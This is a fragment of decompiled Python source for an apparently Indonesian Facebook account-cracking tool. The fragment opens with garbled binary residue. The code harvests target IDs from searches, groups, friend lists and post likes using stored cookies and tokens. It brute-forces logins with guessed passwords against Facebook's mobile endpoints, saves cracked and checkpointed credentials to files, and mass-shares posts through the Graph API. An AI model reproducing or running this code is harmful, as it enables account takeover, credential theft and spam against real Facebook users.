� | �d|� d�|� qCtd| d ��d| d � t�  d S )Nr�   r�   r�   r   z/ |-->Hasil Dump Dari Pencarian Nama DiSimpan : z |-->Jumlah Target : r2   � |-->zMasukan Nama Targetr.  z |-->Nama : z#https://mbasic.facebook.com/public/z?/locale2=id_IDZtxt)r
  r  r  r  rq   r�   r�   r�   r	  r�   r   r9   �dump_pencarianr  r  r{   )r�   r  r   Zjumr  r  rC   rC   rD   r�   C  s   
zmenu.pencarian_nologinc           	   	   C   sJ  t t�t|��jd�}|}z�|�d�D ]}zqt�dt|��}|D ]<\}}d|v r3t�dt|��d }nd|v rAt�dt|��d }t�	|d	 | � t
d
| d d��|d	 | d � q |jddd��d�}|r�tj�dt� tt�� t� d��f tj��  | �||� W q ty�   Y  W d S w W d S  ty�   tj��  Y d S w )NrM   ZtdzJ\<a\ href\="\/(.*?)">\<div\ class\=".*?">\<div\ class\=".*?">(.*?)<\/div\>zprofile.php?zid=(.*)r   z<spanz(.*?)\<r�   r�   r�   r�   r�   rm   zLihat Hasil Selanjutnyarn   ro   � |-->Sedang Mengumpulkan � Idz...)�parser�sesrZ   r^   ra   r]   r_   �findallrv   r  rq   r=   rs   r<   r   r�   r@   r�   rA   r<  �KeyboardInterruptr�   r{   )	r�   ZlinkZnamfirl   Znamaqqr�   rW   r  r�   rC   rC   rD   r<  S  s0   &"
���zmenu.dump_pencarianc              	   C   s6  zt dd��� }dt dd��� i}W n ty0   t�d� t�d� ttd � t�d� Y nw t	�
� jd d	� �� }t d
| d d�}td� td� tdt� dt� dt� dt� �� td� td�}z@t d
| d d�}tjd||f |d��� d D ]%}z|d }|d }t�|d | � |�|d | d � W q~   Y q~W n	 ty�   Y nw dtt� }	|	dks�d|	kr�td� nItdt� dt� dt� d �tt�tf � td!t d
 | d t � td"� td#� ttd$ �}
|
d%v �r
td
| d ��d
| d � t�  n	 tdt� dt� d&�� t�  d S )'Nr�   rl   rd   rk   r�   r�   r!  r�   r�   r�   r�   r   r.  r   r�   r   zMasukan Idz Postinganr0  r�   z>https://graph.facebook.com/%s/likes?limit=5000&access_token=%srK   rW   rv   r�   r�   r�   r�   r   r%  r   r  r  r&  r'  r(  r  r  r  ) rq   rr   r  r�   r�   r{   r�   r:   r;   r
  r  r  r  r   rx   r�   r�   r�   rX   rZ   r�   rv   r  r=   r�   r@   r�   r�   r�   r  r  r�   )r�   r�   rd   r  r   r  rB   r  r�   r+  r  rC   rC   rD   r�   i  sP   

� "
�
(

zmenu.likes_c                    s�   t �d�}|D ]4}d| }zt|d��� }dtt|�� }W n   d}Y ttd t | t	 d t t
 | t � q� fdd	�� td
� � �  td
� d S )Nr   r�   rl   r�   r   r;  �<--|-->c                     sf   zt d�} t| ��| � tj��  W n ty+   td� t�	d� t
d� � �  Y nw tj��  d S )N� |-->Nama File : z. |-->Maaf File Yang Anda Masukan Tidak Ada....r2   r.  )r�   r  r  r�   r<   r{   �FileNotFoundErrorr�   r:   r;   r   )�file��
pilih_filerC   rD   rH  �  s   

�z#menu.crack_file.<locals>.pilih_filer.  )r�   �listdirrq   r9  r^   r@   r   r�   r�   r�   r�   )r�   �dirsrF  �filex�juma�totalrC   rG  rD   r�   �  s   
.zmenu.crack_filec                 C   s  zdt dd��� i}W n   td� t�d� t�  tj��  Y t	d� t	dt
� dt� d	�� t	d
t
� dt� d	�� t	d� td�}|dv rVtd� t�d� | ��  d S |dv re| ��  tj��  d S |dv rz| �t dd��� � tj��  d S td� t�d� | ��  d S )Nrd   rk   rl   �> |-->Maaf Anda Belum Login Cookies... Anda Menuju Login Cokiesr2   r.  z |-->1. Masuakan Idz (�Manualr�   z |-->2. Otomatis (zAmbil Dari Grup Sendiriz |-->Pilih : r�   z |-->Jangan Kosonv Kontol....�r�   r&   �r�   r'   r�   z |-->Isi Dengan Benar Donv....)rq   rr   r�   r:   r;   r�   r�   r<   r{   r   r�   r�   r�   r�   �manual_�ambil_diri_sendiri)r�   rd   ZqiwrC   rC   rD   r�   �  s2   


zmenu.menu_grupc                 C   s�   t �� jd d� �� }td| d d�}tdt d | d t � zdtdd��� i}W n   td	� t	�
d
� t�  tj��  Y dti}td� tdt� dt� �� td�}d| }| �|||� td| d ��d| d � t�  d S )Nr�   r�   r�   r   �% |-->Hasil Dump Dari Grup DiSimpan : rd   rk   rl   rN  r2   r.  r;  zMasuakan Idz Gruopz |-->Target : �5https://mbasic.facebook.com/browse/group/members/?id=)r
  r  r  r  rq   r�   r�   r�   rr   r:   r;   Z	cookie_mer�   r<   r{   Zcokr   r�   rb   r  r  )r�   r  r   rd   �kue�idg�	url_grouprC   rC   rD   rR  �  s$   

zmenu.manual_c                 C   s*  |}z�t tj||d�jd�}|jddd�}|�d�D ]T}zM|d �dd	�}t�d
t	|��d }	t
�t	|�d t	|	� � td| d d��t	|�d t	|	� d � tj�dt� tt
�� t� d��f tj��  W q   Y qdt	|�v r�|jddd�d }
d|
 }| �|||� W d S W d S    Y d S )NrK   rM   �divZobjects_containerr�   Ztablerv   Zmember_r   z <img alt="(.*), profile picture"r   r�   r�   r�   r�   r�   r=  r>  zLihat Selengkapnyarm   rn   ro   rU   )r?  r@  rZ   r\   rs   r]   �replacer_   rA  r^   rv   r  rq   r=   r<   r   r�   r@   r�   rA   rb   )r�   rV  rX  Znama_fiZnama_ffZsop_devZmembersZdevZuser_Znama_rg   Zurl_gruprC   rC   rD   rb   �  s&   ,"
�z
menu.groupc           
   
   C   s�  t �� jd d� �� }td| d d�}tdt d | d t � zdtdd��� i}W n   td	� t	�
d
� t�  tj��  Y d|i}d}z7tjd| |d��� d D ]'}z t�|d � |d
7 }tdt|�t|d tt|d tf � W qW   Y qWW n%   td� zt�d� W n   Y zt�d� W n   Y tj��  Y tdt� dtt�� t� �� tD ]}ztd� d| }	| �||	|� W q� ty�   Y  nw td| d ��d| d � t�  d S )Nr�   r�   r�   r   rT  rd   rk   rl   rN  r2   r   z4https://graph.facebook.com/me/groups?access_token=%srK   rW   rv   z |-->%s. %s%s%s<--|-->%s%s%sr�   z3 |-->Maaf Token Dan Cookies Anda Sudah Kadaluarsa..r�   r;  zTotal Idz Grup Terkumpul : �
 |rU  )r
  r  r  r  rq   r�   r�   r�   rr   r:   r;   r�   r�   r<   r{   r@  rZ   r�   �id_groupr  r   r^   r�   r�   �remover@   rb   rB  r  r  )
r�   r�   rd   r  r   rV  ZnorB   rW  rX  rC   rC   rD   rS  �  sH   
*
�
zmenu.ambil_diri_sendiric                 C   s�  zt dd��� }dt dd��� i}W n ty0   t�d� t�d� ttd � t�d� Y nw t	d	� t
d
t d t d � t
d� t	d	� td�}z3|dkrUd}n*d�|�dd�}d|v rf|dd�}tjd|d�j}t|d�}|jddd�}|j}|}W n   |}Y t dd�}	z?t dd�}	tjd| d | |d�}
t�|
j�d }|d  D ]}|d! }|d" }t�|d# | � |	�|d# | d$ � q�W n	 ty�   Y nw d%tt� }|d&ks�d&|kr�t
d'| d( � t�d� | ��  d S t	d)tt� � td*d+��6}t dd��� }|D ]#}|� d$d,�}|�!d#�}d%|d-  }d%|d.  }|�"| j#|t$|� �qW d   � d S 1 �s=w   Y  d S )/Nr�   rl   rd   rk   r�   r�   r!  r�   r.  r-  r�   r"  z% |-->Masukan Idz Atau Username Targetr0  r�   r�   r�   r�   r�   r�   rM   r�   r�   r�   z.janganeditr   r�   r�   z-?fields=friends.fields(id,name)&access_token=rK   r�   rW   rv   r�   r�   r�   r�   r   z |-->Kemungkinan Id z Ini Tidak DiPublickan !!r6  �   �Zmax_workersr   r   r2   )%rq   rr   r  r�   r�   r{   r�   r:   r;   r   r�   r�   r�   r�   r  rX   rP   r\   r[   rs   ra   rZ   r�   r�   rv   r  r=   r�   r@   r�   �__Kiky__r9  rZ  rt   rT   �lonte_�toket)r�   r�   rd   r  r  r  r  r  r  r   rl   r�   rB   r  r�   r+  Zkiky_gtgrL  rW   ZkikyZmalZnmrC   rC   rD   r�     sj   

�

�

�

�$�zmenu.cek_jumlah_temanc                 C   sV  zHg }g }t jd| d|  td�}t�|j�d }|d D ]}|d }	|�|	� qt jd| d|  td��� d D ]}|d }
|�|
� q;W n	 tyQ   Y nw dt|� }dt|� }|d	ksfd	|krmd
t	t
f }ndt	|t
f }|d	ks|d	|kr�dtt
f }ndt|t
f }|dks�d|kr�d S tdt� |� t
� dt� |� t
� d|� �
� d S )Nr�   r�   rK   r�   rW   rv   z'/subscribers?limit=9999&access_token=%sr�   r   zTeman : %s0%szTeman : %s%s%szPengikut : %s0%szPengikut : %s%s%sr   r;  rC  )rX   rZ   rd   r�   r�   ra   r  r�   r@   r�   r�   r�   r   r�   r�   )r�   Zmlr�   rb  ZgoblokZtololrl   r�   rB   ZFanak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontolZJanak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_aswZ_idZ_idxZvoaZvoaxrC   rC   rD   ra  I  s.   &�.zmenu.lonte_c                 C   s�   t �|�}|D ]p}|d | }zt|d��� }dtt|�� }W n   d}Y z#|�d�d }td t d | }t	|t d t t
 | t � W n   Y z#|�d	�d }	td t d	 |	 }
t	|
t d t t
 | t � W q   Y qd S )
N�/rl   r�   z ?? �	Hasil/OK-r2   r;  z	 <--|--> �	Hasil/CP-)r�   rI  rq   r9  r^   r@   rt   r�   r�   r   rx   r�   )r�   ZfolderrJ  rF  rK  rL  rM  Zijo__Zijo_Zkuning__Zkuning_rC   rC   rD   �cekfile_crkc  s   
HH
�zmenu.cekfile_crkc                 C   s�  | � d� td�}z	t|d��� }W n ty#   td� | ��  Y nw z|�d�d }d}dt }t}W n"   z|�d	�d }d
}dt	 }t	}W n   d}dt
 }t}Y Y tdt|�d� tdd��S}|D ]G}	z;|	�dd�}	z
|	�d�\}
}}W n   |	�d�\}
}d}Y tdt� d|� |� t� d|� |
� d|� d|� t� �� W n   Y t�d� qhW d   � d S 1 s�w   Y  d S )Nr   rD  rl   z |-->Maaf File Tidak DiTemukanzCP-r2   ZCPr�   zOK-ZOKZVvipz |-->Jumlah Akun :r�   �   r_  r   �|z - r8   z|-->�. g{�G�z�?)rf  r�   rq   r9  rE  r�   r�   rt   r�   r�   r�   rx   r   r@   r`  rZ  r�   r:   r;   )r�   �namax�filaZvolakZcopy_riZAssZaSsZvokrN   rW   �user�pwZtllrC   rC   rD   r�   o  sB   
�"�:�"�zmenu.rekc           	      C   s$  | � d� td�}|dkrtd� t�d� t�  ztt|d��� �}W n t	y4   td� t�  Y nw tdt
 t|� t � td	d
��?}t|d��� D ]/}|�dd�}z	|�d�\}}W n   |�d�\}}}Y dtt
|||f }|�t|||� qNW d   � n1 s�w   Y  t�  d S )Nr   rD  r   z |-->Jangan Kosong Sayangr�   rl   z |-->Maaf File Tidak Adaz |-->Total Akun : �   r_  r�   rh  z$%s |-->%s %s|%s|%s                 )rf  r�   r�   r:   r;   r{   r@   rq   r9  rE  r�   r^   r�   r`  rZ  rt   rT   �cek_cookies_by_risky)	r�   Znama_zZtotal__rN   rW   rl  rm  r�   ZbajinganrC   rC   rD   r�   �  s    
  ��
zmenu.cek_apk_hasil_crkc              	   C   s  t d� | �d� t d� td�}z	t|d��� }W n ty0   td� t�d� | �	�  Y nw td� t dt
t|�tf � t d� t d� |D ]4}|�d	d
�}|�d�}t d� t d| � ztd��|d |d � W qJ tjjyz   Y qJ   Y qJt d� td� tj��  d S )Nr.  r   rD  rl   z  |-->Maaf File Tidak Ditemukan..r�   zC |-->Sebelum Lanjut Harap Hidup Matikan Mode Pesawat Selama 2.Detikz) |-->Total Akun Yang Check Point : %s%s%sr�   r   rh  � |-->%sZMemekr   r2   z! |-->Check Akun Sudah Selesai....)r   rf  r�   rq   r9  rE  r�   r:   r;   r�   r�   r@   r�   rZ  rt   r  �cek_opsi_cprX   �
exceptionsr   r�   r<   r{   )r�   rj  rk  �memekr�   �titidrC   rC   rD   r�   �  s4   

�

zmenu.check_opsiic                 C   sr   ddddd�}t jd| d|  t|d�j}d	|v r3t�|�d	 }td
t|�� dt� |� t	� �� d S td� d S )Nzgraph.facebook.comr�   z?0zhMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36)Z	authorityr�   zsec-ch-ua-mobilerJ   z(https://graph.facebook.com/me/feed?link=z&published=0&access_token=%s)rL   r�   rv   r;  z. Berhasil Share Postingan z |-->Gagal Share Postingan)
rX   rP   rd   ra   r�   r�   r   r^   r�   r�   )r�   r�   r�   ZoposttZh1ZdancokZid_prC   rC   rD   �proses_�  s   $zmenu.proses_c                 C   s�   zt dd��� }dt dd��� i}W n# ty5   t�d� t�d� ttd � t�d� tj	��  Y nw t
d	� td
� td�}t
d	� t
d	� tdd��}td�D ]}td7 a|�| jt|t� qTW d   � n1 snw   Y  tj	�d� d S )Nr�   rl   rd   rk   r�   r�   r!  r�   r.  z" |-->Masukan Link Postingan Anda..z |-->Target Post : �   r_  i���r2   z. |-->Jika Berhenti Sendiri Cobalah Ganti Token)rq   rr   r  r�   r�   r{   r�   r:   r;   r<   r   r�   r�   r`  r9   �opostrT   ru  Ztoken_me)r�   r�   rd   Zidz_postrN   rm   rC   rC   rD   r�   �  s*   

���zmenu.Share_Post_v2c           
      C   s�  d}dd� }zt dd��� }dt dd��� i}W n ty6   t�d� t�d	� ttd
 � t�d� Y nw t	d�}|dv rLt
d� t�d� | ��  ztt	d��}W n   d}Y ztt	d��}W n   d}Y td� t
dt� dt� �� t
dt� dt� �� td� tdd��>}t|�D ]1}	|d7 }tj�dt� t� |� t� dt� dt� dt|�� ��f tj��  t�|� |�||� q�W d   � n1 s�w   Y  t
d� tj��  d S )Nr   c                 S   sV   t dd��� }dt dd��� i}ztjdt| � d t|� |d� W d S    Y d S )Nr�   rl   rd   rk   z{https://graph.facebook.com/v2.0/me/feed?method=post&privacy={"value":"EVERYONE"}&message=&link=https://mbasic.facebook.com/z&access_token=rK   )rq   rr   rX   rZ   r^   )Zidpostr�   rd   rC   rC   rD   �cept_�  s
   (zmenu.share_post.<locals>.cept_r�   rl   rd   rk   r�   r�   r!  r�   z |-->Idz Post : r�   z |-->Jangan Kosong...z |-->Limit Share : �d   z |-->Waktu Delay : r2   r.  r;  z9Share Post Sedang Berjalan Harap Tunggu Hingga Selesai...z;Silahkan Check Postingan Yang Anda Share Apakah Berjalan...r_  � |-->�.zBerhasil Share Postz : z
 |-->Berhasil Share Link...)rq   rr   r  r�   r�   r{   r�   r:   r;   r�   r�   �
share_postr	  r   r�   r�   r`  r9   r<   r   r=   r�   r^   rA   rT   )
r�   Zsukksesrx  r�   rd   Zidposttr  Z
time_delayrN   r  rC   rC   rD   r|  �  s@   

�6��zmenu.share_postc                 C   s$   d}d| d }t �dd|g� d S )NZ6281269496231z$https://api.whatsapp.com/send?phone=z&text=ReportZam�start)�
subprocessZcheck_output)r�   Zno_waZurl_warC   rC   rD   r�   �  s   zmenu.menujuwac           	      C   sX  zt dd��� }dt dd��� i}W n ty0   t�d� t�d� ttd � t�d� Y nw zt	j
d	| |d
�}t�|j�}W n   Y z|d }W n   d}Y z|d }W n   d}Y z|d }W n   d}Y z|d }W n   d}Y tdt� |� t� dt� |� t� dt� |� t� dt� |� t� dt� |� t� dt� |� t� d�� d S )Nr�   rl   rd   rk   r�   r�   r!  r�   r�   )rd   r�   r   rv   ru   �birthdayz |
 |-->Nama Facebook : z
 |-->Tanggal Lahir : z
 |-->Idz Facebook  : z
 |-->Username      : z
 |
 |-->Token : z
 |-->Cookie: r[  )rq   rr   r  r�   r�   r{   r�   r:   r;   r@  rZ   r�   r�   ra   r�   r�   r�   r�   r�   )	r�   r�   rd   ZvvZvaZnamaqZid_a�userr�ttlrC   rC   rD   r�   �  sr   

�������������������zmenu.hide_tknN)r�   r�   r�   r�   r�   r�   r�   r�   r3  r�   r�   r:  r�   r<  r�   r�   r�   rR  rb   rS  r�   ra  rf  r�   r�   r�   ru  r�   r|  r�   r�   rC   rC   rC   rD   r�   4  s:    qMHHFP)(3	#r�   c                  C   s   g d�} t �| �}|S )N)��Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36zyMozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36rF   z�Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12r3   ��Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)z{NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+zgNokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)��Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2z�Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]z�Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]a  Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]z�Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]r4   z�Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]r5   )r�   r   )ZugentZrand_uarC   rC   rD   �user_agentAPI  s   
r�  c                  C   s\   t dttttf � t dttttf � t dttttf � tdttttf �} t| � d S )Nz
%s%s%s 01 %sGanti user agent z%s%s%s 02 %sCek user agent z%s%s%s 00 %sKembali z
%s#%s Pilih%s >%s )	r   r�   �tilry   r�   rx   r�   r�   �uas)�_romz_rC   rC   rD   �	useragent4  s
   r�  c              
   C   s  | dkrt dttf � td� t| � d S | dv r�t dttttttttf � t dtttttf � tdttttt	f �}|dv rRt dttf � td� t
�  n@|d	v rqtd
tttf � td� t�d� td� t| � n!|dv r�d}tdd��|� td� t dttf � td� t
�  tdd��|� td� t dttf � td� t
�  d S | dv r�z,tdd��� }td� t dttttt|f � td� tdtttttf � t
�  W d S  ty�   dt }Y d S w | dv r�t
�  d S t dttf � td� t| � d S )Nr   z%s%s isi yang benarr�   rP  zd%s%s%s Ketik %sMy user agent%s di browser google chrome
%s%s%s untuk gunakan user agent anda sendiriz=%s%s%s Ketik %sCancel%s untuk gunakan user agent bawaan toolsz%s%s%s Enter user agent %s: %sz%s%s isi yang benar )zmy user agentzMy User AgentzMY USER AGENTzMy user agentz'%s%s%s Anda akan di arahkan ke browser z@am start https://www.google.com/search?q=My+user+agent>/dev/null)ZCANCELZCancelZcancelr�  zua.txtr   z$
%s%s menggunakan user agent bawaan z#
%s%s berhasil mengganti user agentrQ  rl   z%s%s%s user agent anda%s : %s%sz
%s%s%s [%s Enter%s ] z%s-)r   r�   )r   rx   r�  Zjedar�  r�   r�   r?   r�   r�   r�   r�   r�   r�   r�  rq   r=   rr   r  )r�  �uaZua_rC   rC   rD   r�  ;  sF   

 �
r�  c                   @   s�   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd � Zd!d"� Zd#d$� Zd%d&� Zd'd(� Zd)S )*r  c                 C   s
   g | _ d S �Nr�   )r�   �isifilerC   rC   rD   r�   b  �   
zcrackmenu.__init__c                 C   s�   t d� ttd � t d� td� t td � t�d� t td � t�d� t td t d t d	 � t�d� t td
 t d t d	 � t�d� t td t d t d	 � t�d� t td � t�d� t d� d S )Nr8   zSilahkan Pilih Metode Login !u�   ▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️ Pilih Methode ◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️u   ⏩ 1. B-Api Free (V1)�{�G�z�?u   ⏩ 2. Mobile (V2)u   ⏩ 3. Mobile V3 (zDirekomendasikan V4r�   u   ⏩ 4. Mbasic V1 (zBest Cloning V1u   ⏩ 5. Mbasic V2 (zRecommended V2u   ⏩ 6. Mbasic (V3)u�   ▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️)r   r�   r�   r�   r:   r;   r�   r�   rC   rC   rD   �
menu_crackd  s   &&&zcrackmenu.menu_crackc                 C   s>   t td � td� t d� ttd � t�d� td� d S )NzSilahkan Pilih Methode Login !r.  u?   ▶️ Mainkan Mode Pesawat Selama 5 Detik Jika Tidak Ada Hasilu   ⏩ 1. Mobile V1 r�  )r�   r�   r   r�   r:   r;   r�   rC   rC   rD   �menu_crack_mp  s
   zcrackmenu.menu_crack_mc              
   C   s\   t d� tdt� dt� t� t� dt� d�	� tdt� dt� t� t� dt� d�	� t d� d S )	Nu�   ▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️z |-->Results Crack CP Saved : zResults/CP-r�   rh  z |-->Results Crack OK Saved : zResults/OK-u�   ▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️)r   r�   r�   r�   �durasir�   r�   r�   rC   rC   rD   �pro_sesv  s   $$zcrackmenu.pro_sesc                    s�  z|� _ t� j ��� �� � _W n   ttd � t�d� t	�  Y tdd�}td� td� td� td� t
d	�}td� |d
v r�	 ttd � t
d�}tdtt|f � |dkr`td� nt|�dkrktd� n� ��  t
d�}|dkr�ttd � t�d� t|��|� n-|dks�|dkr�� ��  d'� fdd�	}||�d�� nttd � t�d� t|��|� qD|dv �rO� ��  t
td �}|dkr�ttd � t�d� t|��|� d S |dks�|dkr� ��  d S |dks�|dkr�� ��  d S |dk�s|d k�r� ��  d S |d!k�s|d"k�r� ��  d S |d#k�s%|d$k�r+� ��  d S |d%k�s5|d&k�r;� ��  d S ttd � t�d� t|��|� d S ttd � t�d� t|��|� d S )(NzFile Not Found! Try Againr�   z.pawwr   rh  u(   ▶️ you want to use manual password :u   ▶️ Manual/Defaultr.  u   ▶️ select (M/D): )�mrx   rO  ZmanualTzContoh Password : sayang,123456u   ▶️ Input Password : z %sPassword Yang DiGunakan : %s%sr   u#   ▶️ Isi Password Dengan Benar !!rv  u"   ▶️ Password Minimal 6 Huruf !!u   ▶️ Pilih :zIsi Dengan Benar Lah Kentotr2   r�   r&   c                    s�   t dd��2}� jD ]}z|�d�d }|�� j|| d� W q	   Y q	t�� j� tt	d � W d   � d S 1 s:w   Y  d S )N�#   r_  r�   r   �mbasic.facebook.comzDone !!)
r`  rv   rt   rT   �metoder�   r]  �apkr{   r�   )ZzscrN   r  Zuseridr�   rC   rD   �mobile_n�  s   
&
"�z$crackmenu.passmenu.<locals>.mobile_n�,)�d�DZDefault�defaultzPilih :r�   r'   r�   r(   r�   r)   r�   r*   r�   r+   r�  )r�  rq   rr   �
splitlinesrv   r   r�   r:   r;   r�   r�   r�   r�   r@   r�  r  r  r�  rt   r�  �Opsi_v1�Opsi_v2�Opsi_v3�Opsi_v4�Opsi_v5�Opsi_v6)r�   r�  ZcjjZzk�pwxZjmr�  rC   r�   rD   r  {  s^   $
$�
0((zcrackmenu.passmenuc                 C   s�  t j�dttt�� �d�ttt	| j
�t	t�t	t�tf	 �f t j��  ddk�rv|D �]D}|�� }tg d��}t�� }|j�dd|dddd	d
dddddd�� |�d�j}t�dt|���d�t�dt|���d�|d|dd�}ddddddddd	d
dddddd�}|jd|dd�}	d |j�� v r�d!�d"d#� |j�� �� D ��}
d$|||
f }t�|� t d%t! d& d'��d(| � d)tt"|||
f }t#||
|� t$�%d*�  n�d+|j�� v �rozWt d,d-��&� }d.t d/d-��&� i}tjd0||f |d1��'� d2 }|�(d3�\}}}t)| }t*d4tt+|||||f � d5|||||f }t�|� t d6t! d& d'��d(| � W  n@ t,t-f�yA   d}d}d}Y n   Y t*d7tt+||f � d8||f }t�|� t d6t! d& d'��d(| � t$�%d9�  nq*td7 ad S d S ):N�#%s |-->%s%s%s %s/%s OK:%s CP:%s %sr   r   )�{NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+aa  Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]��Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36r�  r�  z{Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36zfree.facebook.comr�   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�cors�empty�documentzhttps://free.facebook.com/�gzip, deflate br�en-GB,en-US;q=0.9,en;q=0.8��Hostr�   rJ   r�   Zdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-destr�   �accept-encodingr�   zohttps://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F�name="lsd" value="(.*?)"r2   rQ   �login_no_pin�8https://developers.facebook.com/tools/debug/accesstoken/��lsdrS   r  Zflow�passr8  r�   zhttps://free.facebook.com�!application/x-www-form-urlencodedr�  �r�  r�   r�   r�   r�   rJ   r�   r�  r�  r�  r�  r�  r�   r�  r�   zFhttps://free.facebook.com/login/device-based/validate-password/?shbl=0F�rW   �allow_redirects�c_user�;c                 S   �   g | ]
\}}|d  | �qS �rp   rC   ��.0�key�valuerC   rC   rD   �
<listcomp>�  �    z%crackmenu.free_v1.<locals>.<listcomp>�%s|%s|%srd  r�   rm   �%s
�#%s |-->%s%s|%s|%s                 �play-audio data/ok.mp3�
